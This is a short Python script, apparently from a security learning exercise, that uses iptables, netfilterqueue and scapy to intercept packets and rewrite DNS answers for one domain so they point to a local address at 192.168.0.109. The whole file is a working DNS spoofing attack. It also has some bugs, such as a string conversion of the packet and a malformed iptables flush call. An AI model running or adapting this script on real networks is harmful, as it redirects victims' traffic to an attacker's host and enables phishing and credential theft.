import netfilterqueue
import subprocess
import scapy.all as scapy

def process_packet(packet):
    scapy_packet=scapy.IP(packet.get_payload())
    try:
        if scapy_packet.haslayer(scapy.DNSRR):
            
            qname=scapy_packet[scapy.DNSQR].qname
            if "dombeya.myspecies.info" in qname:
                print("[+] Spoofing")
                answer = scapy.DNSRR(rrname=qname, rdata="192.168.0.109")
                scapy_packet[scapy.DNS].an = answer
                scapy_packet[scapy.DNS].ancount = 1

                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum
                packet.set_payload(str(scapy_packet))

        packet.accept()
    except KeyboardInterrupt:
        subprocess.call("iptables", "--flush")

#subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])



packet = netfilterqueue.NetfilterQueue()
packet.bind(0, process_packet)
packet.run()

